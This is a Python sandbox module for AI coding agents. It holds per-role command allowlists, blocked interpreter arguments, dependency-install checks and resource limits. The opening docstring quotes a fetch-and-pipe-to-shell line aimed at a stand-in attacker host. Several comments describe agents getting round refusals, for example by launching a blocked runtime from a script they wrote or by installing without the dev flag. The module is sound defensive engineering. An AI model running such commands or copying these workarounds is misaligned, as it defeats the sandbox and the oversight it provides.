"""Contained command execution for role agents.

Why this module is shaped the way it is
---------------------------------------
The previous implementation validated a command *string* against anchored-prefix
regexes and then handed the whole string to ``sh -c``. That cannot work: a
pattern like ``^npm\\s+.*`` matches ``npm -v; curl evil.com | sh``, and the
shell then runs both halves. Any prefix-based check on a string destined for a
shell is decoration, not a control.

So this module changes the shape of the problem rather than tightening the
pattern list:

1. **Commands are argv lists, never strings.** There is no shell, so shell
   metacharacters have no meaning and there is nothing to escape.
2. **The executable is matched exactly**, against a per-role set. Arguments are
   screened separately for the handful of forms that turn an allowed executable
   back into an arbitrary one (``python -c``, ``npm exec``, and friends).
3. **Execution is contained** - no network by default, bounded memory, CPU and
   process count, dropped capabilities, read-only root filesystem, non-root
   user - so a command that does get through has very little to work with.
4. **It fails closed.** If the container runtime is missing, this raises instead
   of falling back to host execution.
"""

from __future__ import annotations

import contextvars
import json
import logging
import os
import signal
import re
import shutil
import subprocess
import threading
import time
import tomllib
import uuid
from datetime import datetime, timezone
from pathlib import Path

from app.analysis.walk import files_under
from app.tools.repository import IGNORED_DIRECTORIES, NOT_SEARCHED_FOR_A_STAGE
from typing import Any, Dict, Iterable, Sequence

logger = logging.getLogger(__name__)


#: How each package manager spells "add a named dependency", and how it spells
#: "but only for development".
#:
#: Keyed by the executable, one entry per manager the stack selector can
#: choose. Before this, the whole check read
#:
#:     if not any(m in words[0] for m in ("npm", "yarn", "pnpm")): return []
#:
#: so a brief reading "no external dependencies" was enforced for JavaScript
#: and silently unenforced for every other language. Measured on 2026-09-19
#: against the live guard: `pip install pytest`, `cargo add serde`,
#: `go get github.com/gin-gonic/gin`, `dotnet add package Newtonsoft.Json`,
#: `bundle add rspec` and `composer require phpunit/phpunit` were all allowed
#: through a constraint that refused `npm install express`.
#:
#: That is root-cause class H wearing class B's clothes: a rule defined over
#: one member of a set. The table is the rule; `TOOLCHAINS` is the set, and
#: `test_every_toolchain_with_a_package_manager_has_install_grammar` asserts
#: the two agree, so adding a language cannot silently reopen this.
#:
#: `subcommands` are the words that mean "add something not already declared".
#: A bare `npm install` or `pip install -r requirements.txt` installs what the
#: manifest already names and adds nothing, so neither is this.
#:
#: `dev_flags` decide whether a constraint on the shipped product applies at
#: all: a test-scoped dependency ships to nobody. Kept narrow on purpose - a
#: flag not listed here is treated as a production install, which is the safe
#: direction to be wrong in.
_INSTALL_GRAMMAR: dict[str, dict[str, frozenset[str]]] = {
    # JavaScript. `i` is npm's alias for install; `-D`/`--save-dev` is the
    # devDependencies scope `npm ci --omit=dev` never installs.
    "npm":      {"subcommands": frozenset({"install", "add", "i"}),
                 "dev_flags": frozenset({"-d", "--save-dev", "--dev", "--production=false", "--no-save"})},
    "yarn":     {"subcommands": frozenset({"add"}),
                 "dev_flags": frozenset({"-d", "--dev"})},
    "pnpm":     {"subcommands": frozenset({"add", "install", "i"}),
                 "dev_flags": frozenset({"-d", "--save-dev", "--dev"})},
    "bun":      {"subcommands": frozenset({"add", "install", "i"}),
                 "dev_flags": frozenset({"-d", "--dev", "--development"})},
    # Python. `pip` has no dev scope at all - a dev dependency is a separate
    # requirements file - so nothing here is exempt and that is correct.
    "pip":      {"subcommands": frozenset({"install"}), "dev_flags": frozenset()},
    "pip3":     {"subcommands": frozenset({"install"}), "dev_flags": frozenset()},
    "uv":       {"subcommands": frozenset({"add"}),
                 "dev_flags": frozenset({"--dev", "-d", "--group"})},
    "poetry":   {"subcommands": frozenset({"add"}),
                 "dev_flags": frozenset({"--dev", "-d", "--group"})},
    # Rust, Go, .NET.
    "cargo":    {"subcommands": frozenset({"add"}), "dev_flags": frozenset({"--dev"})},
    "go":       {"subcommands": frozenset({"get"}), "dev_flags": frozenset()},
    "dotnet":   {"subcommands": frozenset({"add"}), "dev_flags": frozenset()},
    # Ruby, PHP.
    "gem":      {"subcommands": frozenset({"install"}), "dev_flags": frozenset()},
    "bundle":   {"subcommands": frozenset({"add"}),
                 "dev_flags": frozenset({"--group", "--groups"})},
    "composer": {"subcommands": frozenset({"require"}), "dev_flags": frozenset({"--dev"})},
    # Dart and Flutter.
    "dart":     {"subcommands": frozenset({"add"}), "dev_flags": frozenset({"--dev"})},
    "flutter":  {"subcommands": frozenset({"add"}), "dev_flags": frozenset({"--dev"})},
    # Elixir. `mix deps.get` resolves what mix.exs already declares; only
    # `mix deps.add` names a new one, and not every version has it.
    "mix":      {"subcommands": frozenset({"deps.add"}), "dev_flags": frozenset()},
}

#: Words that appear where a package name would and are not one. Per manager
#: rather than global: `dotnet add package X` and `go get -u ./...` each carry
#: their own noise, and a global list would have to hold every manager's.
_NOT_A_PACKAGE_NAME: dict[str, frozenset[str]] = {
    "dotnet": frozenset({"package", "reference"}),
    "bundle": frozenset({"development", "test", "dev"}),
    "go": frozenset({"./...", "all"}),
    "uv": frozenset({"dev"}),
    "poetry": frozenset({"dev"}),
}

#: Arguments meaning "install from a manifest", which adds nothing new. `-r`
#: and `--requirement` for pip, `-f`/`--file` where a manager takes one.
_FROM_A_MANIFEST = frozenset({"-r", "--requirement", "--requirements"})


def _manager_of(command: Sequence[str]) -> str | None:
    """The package manager this command drives, by argv[0], or None.

    Matched on the basename exactly rather than by substring. The previous
    substring test (`if "npm" in words[0]`) also matched any path containing
    those three letters, which is the class of bug `validate_command` already
    fixed for executables.
    """
    if not command:
        return None
    return os.path.basename(str(command[0])) or None


def _a_package_this_command_would_add(command: Sequence[str]) -> list[str]:
    """The package names an install command would add, or [].

    A bare `npm install`, a `pip install -r requirements.txt` and a
    `mix deps.get` all install what the manifest already declares and add
    nothing, so none of them is this. Only a named package is.

    Technology-agnostic by table: see `_INSTALL_GRAMMAR`.
    """
    manager = _manager_of(command)
    grammar = _INSTALL_GRAMMAR.get(manager or "")
    if grammar is None:
        return []
    words = [str(word) for word in command]
    # The subcommand is near the front; anything further in is an argument.
    if not any(word in grammar["subcommands"] for word in words[1:4]):
        return []
    if any(word in _FROM_A_MANIFEST for word in words):
        return []
    noise = _NOT_A_PACKAGE_NAME.get(manager or "", frozenset())
    named = [
        word
        for index, word in enumerate(words[1:], start=1)
        if not word.startswith("-")
        and word not in grammar["subcommands"]
        and word not in noise
        and word != manager
        # The value of a flag that says where, not what. One run's
        # `npm --prefix simple-to-do-list-app install` installs what the
        # manifest declares, and was refused as adding a package named after
        # the project's own directory.
        and words[index - 1] not in _FLAGS_THAT_NAME_A_PLACE
    ]
    return named


#: Flags whose next word is a directory, a file or a registry, never a package.
_FLAGS_THAT_NAME_A_PLACE = frozenset({
    "--prefix", "-C", "--cwd", "--dir", "--directory", "--root", "--project",
    "--manifest-path", "--path", "--target", "--target-dir", "--workspace",
    "--filter", "--registry", "--index-url", "--extra-index-url", "--cache",
    "--cache-dir", "--userconfig", "--globalconfig", "--config", "--python",
})


#: Subcommands that fetch what a manifest already declares, beside the ones in
#: `_INSTALL_GRAMMAR` that add something new. Both need the registry.
_RESOLVE_SUBCOMMANDS: dict[str, frozenset[str]] = {
    "npm": frozenset({"ci"}),
    "yarn": frozenset({"install"}),
    "pip": frozenset({"download"}),
    "pip3": frozenset({"download"}),
    "uv": frozenset({"sync", "pip"}),
    "poetry": frozenset({"install"}),
    "cargo": frozenset({"fetch"}),
    "dotnet": frozenset({"restore"}),
    "bundle": frozenset({"install"}),
    "composer": frozenset({"install"}),
    "dart": frozenset({"pub"}),
    "flutter": frozenset({"pub"}),
    "mix": frozenset({"deps.get"}),
}


def _fetches_dependencies(command: Sequence[str]) -> bool:
    """Whether this command downloads packages through a package manager.

    Such a command belongs in the `install` category whatever the caller
    sent: that is the category with the registry and the time to use it.
    Measured on one run: `npm i -D jest` arrived with no category, ran under
    the 120-second default instead of the install limit, and timed out - to
    advice about servers, watchers and browser test suites, none of which it
    was.
    """
    manager = _manager_of(command)
    if not manager:
        return False
    words = [str(word).lower() for word in command[1:]]
    if not words:
        return False
    first = next((word for word in words if not word.startswith("-")), "")
    grammar = _INSTALL_GRAMMAR.get(manager)
    if grammar is not None and first in grammar["subcommands"]:
        return True
    if first in _RESOLVE_SUBCOMMANDS.get(manager, frozenset()):
        return True
    # `go mod download` - the one resolve step that is two words.
    return manager == "go" and words[:2] == ["mod", "download"]


def _runs_tests(command: Sequence[str]) -> bool:
    """Whether this command runs a test suite, in any language.

    Such a command belongs in the `test` category whatever the caller sent,
    as an install belongs in `install`. Measured on one run:
    `npm test` arrived with no category, ran under the 120-second default,
    and timed out - its end-to-end half alone took 144 seconds when the stage
    ran it again as `npm run test:e2e` with `category: "test"`.

    Recognised by shape, not by a list of tools: a `test` subcommand or a
    `test:*` script among the first few words (`npm test`, `npm run test:e2e`,
    `go test`, `cargo test`, `npx playwright test`, `dotnet test`, `node --test`), a program
    named for testing (`pytest`, `phpunit`), or `python -m pytest|unittest`.
    """
    words = [Path(str(word)).name.lower() for word in command[:4]]
    if not words:
        return False
    if any(word in ("test", "--test") or word.startswith(("test:", "test-")) for word in words[1:]):
        return True
    if ("test" in words[0] or words[0].endswith("unit")) and not words[0].startswith("-"):
        return True
    return len(words) >= 3 and words[1] == "-m" and words[2] in ("pytest", "unittest")


def _is_a_test_only_install(command: Sequence[str]) -> bool:
    """Whether this install puts its packages somewhere the product does not ship.

    `npm install -D @playwright/test` writes to `devDependencies`, which
    `npm ci --omit=dev` never installs and the user never receives. A brief
    forbidding dependencies constrains the product, not the machine that builds
    it - see `app.agents.testing_dependency_rule` - so a test-scoped install
    breaks no constraint the brief states.

    A bare `npm install <pkg>` writes to `dependencies` and IS the product's,
    so it is still refused as before.

    Per manager, because the flag differs and a global list would exempt
    `--dev` for a manager that has no dev scope. `pip` genuinely has none, so
    no `pip install` is ever exempt - which is right, not an omission.

    `--group`-style flags are only a dev scope when the group they name is a
    development one; `poetry add --group runtime x` ships.
    """
    manager = _manager_of(command)
    grammar = _INSTALL_GRAMMAR.get(manager or "")
    if grammar is None:
        return False
    words = [str(word).lower() for word in command]
    for index, word in enumerate(words):
        if word not in grammar["dev_flags"]:
            continue
        if word in ("--group", "--groups"):
            following = words[index + 1] if index + 1 < len(words) else ""
            if following not in _DEVELOPMENT_GROUPS:
                continue
        return True
    return False


#: Group names that mean "not shipped", for the managers that scope by group.
_DEVELOPMENT_GROUPS = frozenset({"dev", "development", "test", "testing"})


def _the_brief_forbids_installing_anything(repo_root: str) -> str:
    """The brief's own words ruling dependencies out, or "".

    Read from the workspace rather than passed in: the sandbox is below the
    agent layer and is handed a repository, not a brief. The intake document
    is where the constraint lands - one run's `docs/product_intake.md`
    carries "No external dependencies beyond basic HTML/CSS/JS" twice.
    """
    try:
        from app.agents.brief_constraints import _FORBIDS_DEPENDENCIES

        for name in ("product_intake.md", "technology_stack.md"):
            document = Path(repo_root) / "docs" / name
            if not document.is_file():
                continue
            text = document.read_text(encoding="utf-8", errors="replace")
            for line in text.splitlines():
                if any(phrase in line.lower() for phrase in _FORBIDS_DEPENDENCIES):
                    return line.strip().lstrip("-*# ").strip()
    except Exception:  # noqa: BLE001 - a constraint that cannot be read is not enforced
        return ""
    return ""


def _refuse_an_install_the_brief_rules_out(
    command: Sequence[str], repo_root: str
) -> str:
    """Why this install contradicts the brief, or "".

    The testing role's own description already says not to introduce a runner
    the stack did not choose, and to "verify with what the runtime already
    provides" where the stack names none. One run read that and ran
    `npm install jsdom`, then `npm install jest`. Six of the twenty-six
    recorded runs install a named package this way - jsdom four times, jest,
    and jest-environment-jsdom - against briefs that rule dependencies out.

    Every check that reports the dependency reports it downstream of this
    command: `what_the_brief_forbids_that_is_there` at a milestone review,
    the module-system findings a sprint later. This is where it enters.

    A refusal, not a note, on the escalation the codebase has settled twice:
    the instruction is already in the prompt, in the role's own words, and is
    being ignored.

    Not every install is the product's. A test-scoped one - `npm i -D` - lands
    in `devDependencies`, which ships to nobody, so the constraint on the
    shipped product has nothing to say about it and it is allowed through.
    Measured on one run: `specialist_ui_ux_0` needed `@playwright/test`
    for the only suite that can exercise a real DOM, this refusal blocked it,
    and the model installed the package *without* the flag to get past the
    refusal - leaving it in `node_modules` and absent from `package.json`,
    which the milestone reviewer then filed as a blocking defect from the other
    direction. The constraint was never aimed at the test suite; refusing its
    install made the product worse and the review wrong.
    """
    packages = _a_package_this_command_would_add(command)
    if not packages:
        return ""
    if _is_a_test_only_install(command):
        # The rule is stated in the prompt and this is the install it asks for.
        # Recording it as a risk or refusing it is the constraint applied to
        # the wrong thing.
        return ""
    constraint = _the_brief_forbids_installing_anything(repo_root)
    if not constraint:
        return ""
    return (
        f"Refusing to install {', '.join(packages[:4])}: the brief rules that "
        f'out in its own words - "{constraint}". Installing it does not make '
        "the product the brief describes, and every later stage would have to "
        "carry it or take it back out. Node's own `node:test` and "
        "`node:assert` need no install, and logic written as functions that "
        "take their inputs as arguments can be tested without a DOM at all. "
        "If the product genuinely cannot be built within the constraint, say "
        "so as a blocker in your report rather than installing past it. "
        "A test suite is a different matter: `npm i -D <pkg>` puts it in "
        "`devDependencies`, which is not shipped and breaks no constraint in "
        "the brief."
    )


class SandboxUnavailable(RuntimeError):
    """The container runtime needed to isolate execution is not usable."""


class CommandNotAllowed(ValueError):
    """The requested command is not permitted for this role."""


# Executables each role may invoke, matched exactly against argv[0].
ROLE_EXECUTABLES: dict[str, frozenset[str]] = {
    # `make` is added across build-capable roles: a Makefile is the entry point
    # for a large share of real projects, and without it those cannot be built
    # at all. It executes only what the repository's own Makefile contains,
    # which the agent wrote through the gated write tool.
    # Keyed by the name the sandbox is actually called with -
    # `f"{role}_specialist"` for each `SpecialistRole`. This read
    # `ui_specialist` while the role is `ui_ux`, so the key matched nothing and
    # the frontend specialist silently ran with the common set alone: on
    # one run it was refused `node` eight times while building a web page.
    # `test_every_specialist_role_has_an_allowlist` now pins the correspondence.
    "ui_ux_specialist": frozenset({
        "npm", "npx", "node", "yarn", "pnpm", "make", "python3", "jest", "vitest", "tsc",
        # See TOOLCHAINS: the rule that governs this role's own work names
        # Playwright as mandatory, and the role could not name it back.
        "playwright",
    }),
    # `node` belongs here for the same reason `npx` already did: a JavaScript
    # backend's entry point is `node server.js`, and without it the role that
    # wrote the file cannot run it. On one run the backend specialist was
    # refused `node -e "require('./todo-app/script.js').initTodoApp()"` - a
    # smoke test of code it had just written - while `npx` (which can run any
    # package at all) was permitted.
    "backend_specialist": frozenset({
        "python", "python3", "pip", "pip3", "pytest", "cargo", "go", "uv", "make",
        "npm", "npx", "node", "yarn", "pnpm",
    }),
    # A migration is a script, and the role that writes one has to run it.
    #
    # The JavaScript runtime is here for the fourth time this mistake has been
    # made, and this was the only code-writing role still without it - even
    # `documentation_specialist`, which writes prose, had `node`. The stack is
    # chosen per run, so "database" does not mean SQL: on a browser-storage
    # brief the persistence layer *is* JavaScript, and on one run this
    # role wrote `app.js`, `app.test.mjs` and a `package.json`, then could not
    # run any of them.
    #
    # Withholding it bought nothing, exactly as it bought nothing for
    # `testing_specialist` on one run. Refused `node --test`, the agent
    # tried `python3 -c "subprocess.run(['node', ...])"` (refused), then wrote
    # `run-tests.py` to subprocess-launch node - which was permitted and ran.
    # What the refusal actually bought was 145 events of thrashing and
    # attempts like `python3 app.test.mjs`, and
    # `exec(open('app.test.mjs').read().replace('export {', '// export {'))` -
    # running JavaScript through the Python interpreter.
    "database_specialist": frozenset({
        "prisma", "psql", "alembic", "python", "python3", "make",
        "node", "npm", "npx",
    }),
    # Test runners as well as package managers. The role whose entire job is
    # running tests could run `pytest` and no JavaScript runner at all - on a
    # brief that is explicitly HTML/CSS/JavaScript. Worse, the refusal bought
    # nothing: `npx` was already permitted, so `npx jest` ran jest anyway. What
    # it did buy, on one run, was the agent reasoning "We cannot run jest
    # because not allowed... we can set package.json test script and run npm
    # test" - writing a manifest at the workspace root, which is the collision
    # that cost the previous run three remediation rounds.
    #
    # These are test runners, not shells. `_FORBIDDEN_ARGS` still blocks the
    # argument forms that turn an interpreter back into a general one.
    "testing_specialist": frozenset({
        "pytest", "python", "python3", "npm", "npx", "yarn", "pnpm", "go", "cargo", "make",
        "jest", "mocha", "vitest", "jasmine", "karma", "tsc", "playwright",
        # The role whose job is running tests must be able to run a test script.
        # Measured on one run: the testing specialist wrote a plain
        # `test-harness.js`, found `node` missing, and reasoned that it had
        # `npx` available - running it as `npx node test-harness.js`. That works
        # by accident, and `npx` can execute any package at all, so withholding
        # `node` bought no safety and cost a turn.
        "node",
    }),
    # Writes prose, and checks it against the code it documents.
    "documentation_specialist": frozenset({"python3", "node", "npx"}),
    # Audits what the other roles built: it has to be able to run the project
    # to test it. Refused `node` and `python3` on one run while auditing a
    # JavaScript application.
    "security_reliability_specialist": frozenset({
        "python", "python3", "pip", "pip3", "pytest", "node", "npm", "npx", "make",
    }),
    "principal_architect": frozenset({"npx", "npm", "django-admin"}),
}

# Available to every role. Deliberately excludes `rm`, `mv` and `cp`: the write
# tool is the only sanctioned mutation path, and a destructive filesystem verb
# adds no capability an agent legitimately needs.
COMMON_EXECUTABLES = frozenset({
    "ls", "cat", "echo", "mkdir", "touch", "git", "pwd", "find", "head", "tail", "wc",
    # Read-only inspection. Neither can modify a file or execute anything, and
    # both are what an agent reaches for by reflex: `grep` was the single most
    # refused command on one run (17 of 43 refusals), and every refusal
    # cost a model call to learn something the allowlist could have allowed.
    "grep", "which",
})

# Argument forms that would turn an allowed interpreter back into a general one.
#
# `TOOLCHAINS` pins seventeen languages and the inline-eval half of this table
# covered two of them. Measured 2026-09-27 by calling `validate_command` once
# per toolchain with the stack marker set to that language: `node -e` and
# `python3 -c` were refused, and `ruby -e`, `php -r`, `elixir -e`, `scala -e`,
# `rake -e`, `mix run -e` and `gradle -I` were all permitted. The policy was
# never JavaScript-and-Python-only; only its enforcement was.
#
# `go run .` and `cargo run` stay permitted deliberately. They compile and run
# the project in front of them, which is a build step, not code in an argument.
#
# `bundle exec`, `poetry run`, `uv run` and `composer exec` were added here in
# the same pass and then taken back out, which is worth recording because the
# argument for them looks sound. They run a program the allowlist never cleared,
# exactly as the `npm exec` entry below does - but blocking `npm exec` never
# closed that hole, because `npx <anything>` is permitted and does the same
# thing. So refusing the others would not have made the boundary tighter; it
# would only have made every non-JavaScript language stricter than JavaScript.
# It also took away ordinary work with no replacement: `bundle exec rspec`,
# `bundle exec rake db:migrate` and `poetry run pytest` are how a Ruby or Python
# project reaches the tools inside its own bundle or virtualenv.
# `test_a_real_build_step_still_runs` pins them.
_FORBIDDEN_ARGS: dict[str, frozenset[str]] = {
    "python": frozenset({"-c"}),
    "python3": frozenset({"-c"}),
    "node": frozenset({"-e", "--eval", "-p", "--print"}),
    "npm": frozenset({"exec"}),
    "npx": frozenset({"-c", "--call"}),
    "yarn": frozenset({"exec"}),
    "pnpm": frozenset({"exec"}),
    "git": frozenset({"-c", "--exec-path", "--upload-pack", "--receive-pack"}),
    # -f/--file would run a makefile from anywhere; --eval injects rules on the
    # command line. Both turn `make` into a general interpreter pointed at
    # something the workspace does not contain.
    "make": frozenset({"-f", "--file", "--makefile", "--eval", "-e"}),
    # `-e` means "here is the program" to every interpreter that has it, so the
    # same refusal applies for the same reason. A flag a given interpreter does
    # not actually accept costs nothing to list: the only command it can refuse
    # is one that was trying to evaluate a snippet anyway.
    "ruby": frozenset({"-e"}),
    "php": frozenset({"-r", "-a"}),
    "elixir": frozenset({"-e", "--eval"}),
    "scala": frozenset({"-e"}),
    "rake": frozenset({"-e", "--execute"}),
    "mix": frozenset({"-e", "--eval"}),
    # An injected or redirected build script, exactly as `make -f` is. `gradle
    # test` and `gradle build` are untouched; only "use this build file instead"
    # is refused.
    "gradle": frozenset({"-I", "--init-script", "-b", "--build-file"}),
}

#: Why each program's arguments above are refused, which decides what the
#: refusal tells the agent to do instead. Advice that does not fit the command
#: is worse than none: "put the code in a file" is the right answer for
#: `ruby -e` and nonsense for `bundle exec rspec`, whose answer is "run
#: `rspec`". Keyed by program so a new entry above cannot silently inherit
#: advice meant for a different shape; pinned by
#: `test_every_refused_argument_says_what_to_do_instead`.
_WHY_THE_ARGUMENT_IS_REFUSED: dict[str, str] = {
    "python": "eval",
    "python3": "eval",
    "node": "eval",
    "ruby": "eval",
    "php": "eval",
    "elixir": "eval",
    "scala": "eval",
    "rake": "eval",
    "mix": "eval",
    # `make` holds both shapes - `-f` redirects the build, `--eval` supplies a
    # rule inline - and the build-file answer covers each of them.
    "make": "foreign_build_file",
    "npm": "any_program",
    "npx": "any_program",
    "yarn": "any_program",
    "pnpm": "any_program",
    "gradle": "foreign_build_file",
    "git": "reconfigures_the_tool",
}

_ALLOWED_PYTHON_MODULES = frozenset({"venv", "pip", "pytest", "unittest"})
"""Modules `python -m` may run.

`-m` was refused outright, which is too blunt: it is also the standard way to
do ordinary Python work, and blocking it left an agent unable to create a
virtualenv, install anything, or run a test suite. Refusing it did not even buy
much - `pip` and `pytest` are permitted as executables already, so `python -m pip`
grants nothing `pip` does not.

`-c` stays refused, because that genuinely is "here is a program, run it". So
is everything not named above - `http.server`, for one, would publish the
workspace on the network, which is an escape hatch rather than a build step.
"""


def _max_output_size() -> int:
    """Per-command output cap, in bytes.

    An iterative specialist accumulates one of these per command, and compaction
    keeps the most recent messages *untouched* - so this cap multiplied by the
    protected tail is a floor on context that compaction cannot reduce. Held
    independent of the window, that product is what killed a specialist stage:
    a 50 KB cap across a 20-message tail is ~123k tokens of untouchable context.

    Derived from the window instead, so the two cannot drift apart. The full
    output is still on disk and reachable via `read_command_output`; this bounds
    what enters the conversation, not what is kept.
    """
    from app.agents.context_budget import ContextBudget

    return ContextBudget.resolve().tool_output_bytes


MAX_OUTPUT_SIZE = _max_output_size()

TIMEOUTS = {"install": 300, "build": 180, "test": 300, "default": 120}

#: How much longer than the JavaScript baseline each toolchain needs.
#:
#: The table above was measured on npm and applied to everything. A `cargo
#: build` of a dependency tree, a Gradle build, a `dotnet restore` or a first
#: `go build` of a module routinely exceed 180 seconds on a cold cache, and
#: the timeout then reports "Command timed out" for a build that was working -
#: which sends the agent to shrink the build rather than wait for it.
#:
#: Scaled rather than tabulated per (stack, category): the shape of the
#: difference is "this toolchain compiles", not "this toolchain's install is
#: slow and its test is fast", and one number per toolchain is one thing to
#: get wrong instead of four.
#:
#: These are ratios, not measurements - the harness does not yet have enough
#: recorded durations per language to derive them. `_record_execution` now
#: stores `duration_seconds` so that it will, and so B3's measured version
#: (p95 of successful runs, doubled) can replace this table with evidence.
#: Until then a generous ratio costs a slow run its patience and a tight one
#: costs it the build.
TOOLCHAIN_TIMEOUT_SCALE: dict[str, float] = {
    "rust": 4.0,       # cargo builds the dependency tree from source
    "java": 3.0,       # maven/gradle resolve and compile
    "kotlin": 3.0,
    "swift": 3.0,
    "csharp": 2.5,     # dotnet restore then build
    "dart": 2.0,       # flutter pub get is large
    "scala": 4.0,
    "cpp": 3.0,
    "c": 2.0,
    "go": 1.5,         # fast, but a cold module cache is not
    "elixir": 1.5,
    "python": 1.0,
    "ruby": 1.5,       # native gem extensions compile
    "php": 1.0,
    "javascript": 1.0,
    "typescript": 1.0,
}

#: No command waits longer than this, whatever the scale works out to. A
#: command that has not finished in fifteen minutes is not slow, it is stuck,
#: and the timeout is the only thing that will ever end it.
MAX_TIMEOUT_SECONDS = 900


def timeout_for(category: str, repo_root: str | Path | None = None) -> int:
    """Seconds this command may run, given the category and the run's stack.

    Never raises: an unreadable pin yields the unscaled baseline, which is
    exactly the behaviour before this existed.
    """
    base = TIMEOUTS.get(category, TIMEOUTS["default"])
    try:
        pinned = project_stack(repo_root)
    except Exception:  # noqa: BLE001 - a timeout must not fail the command
        return base
    if not pinned:
        return base
    # The slowest toolchain in the stack decides. A Rust backend with a
    # TypeScript frontend builds at Rust's pace.
    scale = max((TOOLCHAIN_TIMEOUT_SCALE.get(key, 1.0) for key in pinned), default=1.0)
    return int(min(base * scale, MAX_TIMEOUT_SECONDS))

#: The least a command is given after its last run used the whole limit, and
#: the share of the limit it gets.
SHORTEST_RETRY_TIMEOUT_SECONDS = 60
RETRY_TIMEOUT_SHARE = 0.2


def after_a_run_that_never_finished(
    repo_root: str | Path | None,
    argv: Sequence[str],
    working_directory: str | None,
    timeout: int,
) -> int:
    """`timeout`, or a fraction of it when this command's last run used it all.

    A command that ran the whole limit and was stopped is usually one that
    cannot finish - a test with a loop that never ends, a server left
    listening - and the stage that ran it runs it again to see. Measured on
    one run: a suite with `while (state.tasks.length)` over a stale copy was
    run three times in one sprint, 300 seconds each, a quarter of an hour in
    which nothing else happened.

    So the next run of the same command, in the same directory, gets a short
    limit: enough for a command that now finishes, a fifth of the wait for one
    that still does not. Only the next one. A run stopped at the short limit
    is followed by a full one, so a command that is merely slow is never held
    to the short limit twice running. Never raises.
    """
    try:
        wanted = [str(part) for part in argv]
        for entry in reversed(read_execution_ledger(str(repo_root), limit=400, by_the_agents=True)):
            if entry.get("command") != wanted or not _same_invocation(
                entry, wanted, working_directory
            ):
                continue
            spent = entry.get("duration_seconds")
            if (
                str(entry.get("error") or "").lstrip().startswith("Command timed out")
                and isinstance(spent, (int, float))
                and spent >= timeout * 0.9
            ):
                return max(SHORTEST_RETRY_TIMEOUT_SECONDS, int(timeout * RETRY_TIMEOUT_SHARE))
            return timeout
    except Exception:  # noqa: BLE001 - a timeout must not fail the command
        return timeout
    return timeout


# Resource ceilings. A fork bomb or a runaway build hits these instead of the host.
MEMORY_LIMIT = os.environ.get("SANDBOX_MEMORY_LIMIT", "4g")
CPU_LIMIT = os.environ.get("SANDBOX_CPU_LIMIT", "2")
PIDS_LIMIT = os.environ.get("SANDBOX_PIDS_LIMIT", "512")

# Installing dependencies genuinely needs a registry, so network is granted per
# category rather than globally. Everything else runs with no network at all.
NETWORK_CATEGORIES = {"install"}

CONTAINER_MODE = "container"
IN_CONTAINER_MODE = "in-container"


def execution_mode() -> str:
    """Where a validated command actually runs.

    ``container`` (the default) starts a throwaway container per command, which
    needs a container runtime reachable from this process - in a Docker
    deployment that means mounting the daemon socket, and that socket is
    root-equivalent on the host.

    ``in-container`` runs the command directly in this container instead, as the
    unprivileged user, in the run's workspace. It is a deliberate trade: the
    command is contained by *this* container rather than by one of its own, so
    it can reach anything this process can, but nothing gains access to the
    host. For a single-tenant deployment that is the better end of the trade,
    because the alternative is handing the host's root out to whatever an
    uploaded document talks an agent into running.
    """
    configured = os.environ.get("SANDBOX_EXECUTION_MODE", CONTAINER_MODE).strip().lower()
    return IN_CONTAINER_MODE if configured in {IN_CONTAINER_MODE, "local", "direct"} else CONTAINER_MODE


# Ceilings applied to a directly-executed command. Without a container to
# enforce them, these are what stops a runaway build taking the worker with it.
_MEMORY_BYTES = {"k": 1024, "m": 1024**2, "g": 1024**3}


def _memory_limit_bytes() -> int:
    raw = MEMORY_LIMIT.strip().lower()
    multiplier = _MEMORY_BYTES.get(raw[-1:], 1)
    digits = raw[:-1] if multiplier > 1 else raw
    try:
        return int(float(digits) * multiplier)
    except ValueError:
        return 2 * 1024**3


MAX_WRITE_BYTES = int(os.environ.get("SANDBOX_MAX_FILE_BYTES", str(2 * 1024**3)))
"""Largest single file a command may write. A build that fills the shared
workspace volume takes every other run down with it."""


# Variables a command legitimately needs. Everything else in this process's
# environment is withheld, because the worker holds the database password, the
# JWT secret, the object-store credentials and every provider API key - and a
# command that runs `env` would otherwise print all of them straight into the
# model's context.
_ENV_PASSTHROUGH = (
    "PATH", "LANG", "LC_ALL", "TZ",
    "HTTP_PROXY", "HTTPS_PROXY", "NO_PROXY",
    "http_proxy", "https_proxy", "no_proxy",
)


def _usable_cpus() -> int:
    """How many CPUs this container may actually use, not how many exist.

    Kept as a name here because callers and tests use it; the reading lives in
    `app.tools.resources`, which the pre-flight check also uses, so there is one
    answer rather than two that can drift.
    """
    from app.tools.resources import usable_cpus

    return usable_cpus()


def _concurrency_environment() -> Dict[str, str]:
    """Environment that tells child tools the real concurrency and heap budget.

    Per-process rlimits multiply by the number of processes, so bounding one
    process is not bounding the command. The numbers come from
    `app.tools.resources`, which reads what is free now rather than only what
    the configuration allows: a container already holding a large conversation
    hands out a smaller heap than an idle one, which is the case that killed
    one run twice.
    """
    from app.tools.resources import concurrency_environment

    return concurrency_environment(_memory_limit_bytes())


#: Settings a toolchain needs to run inside this sandbox at all - not secrets,
#: and the same for every command.
#:
#: .NET maps its executable memory twice, through a file it sizes far beyond
#: the largest file a command may write (`MAX_WRITE_BYTES`, as RLIMIT_FSIZE):
#: every `dotnet` command, `dotnet --version` included, was killed by SIGXFSZ
#: before printing a word. Its write-xor-execute hardening is off in here; the
#: sandbox's own limits are the boundary.
TOOLCHAIN_ENVIRONMENT = {
    "DOTNET_EnableWriteXorExecute": "0",
    "DOTNET_CLI_TELEMETRY_OPTOUT": "1",
    "DOTNET_NOLOGO": "1",
    "NEXT_TELEMETRY_DISABLED": "1",
    # Go fetched a newer toolchain into the run's workspace (some 250 MB)
    # whenever a module asked for one, every run. A module that needs a newer
    # Go than the image's is now an error the stage can act on.
    "GOTOOLCHAIN": "local",
}


def _child_environment(workspace: str, extra_env: Dict[str, str] | None) -> Dict[str, str]:
    """A minimal environment for a directly-executed command."""
    environment = {
        key: os.environ[key] for key in _ENV_PASSTHROUGH if os.environ.get(key)
    }
    environment.setdefault("PATH", "/usr/local/bin:/usr/bin:/bin")
    # Tool caches (npm, pip, cargo) land in the workspace rather than in a
    # home directory shared by every run.
    home = os.path.join(workspace, ".agent-home")
    os.makedirs(home, exist_ok=True)
    environment["HOME"] = home
    environment["TMPDIR"] = home
    # Playwright's browsers are large (Chromium alone is ~190MB) and are
    # downloaded by `npx playwright install`, which runs as a child of this
    # function and therefore writes to `home` above - the workspace, not a
    # home directory that survives no longer than the command. Point the child
    # back at that same cache on every later command, or a run that downloaded
    # Chromium once downloads it again and still cannot run it.
    #
    # The image-level cache below is still checked first: a browser shipped in
